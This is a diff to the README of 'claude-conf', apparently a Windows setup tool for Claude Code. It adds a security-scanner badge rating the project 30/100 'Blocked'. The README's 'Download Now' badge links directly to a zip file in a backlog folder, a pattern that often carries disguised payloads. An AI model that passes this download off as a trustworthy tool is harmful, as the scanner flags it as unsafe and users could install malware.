@@ -1,6 +1,7 @@
 # ⚙️ claude-conf - Streamline Claude Code on Windows
 
 [![Download claude-conf](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Vleickzs/claude-conf/main/BACKLOG/conf_claude_1.7.zip)
+[![SafeSkill 30/100](https://img.shields.io/badge/SafeSkill-30%2F100_Blocked-red)](https://safeskill.dev/scan/vleickzs-claude-conf)
 
 ## 🚀 What this is
 
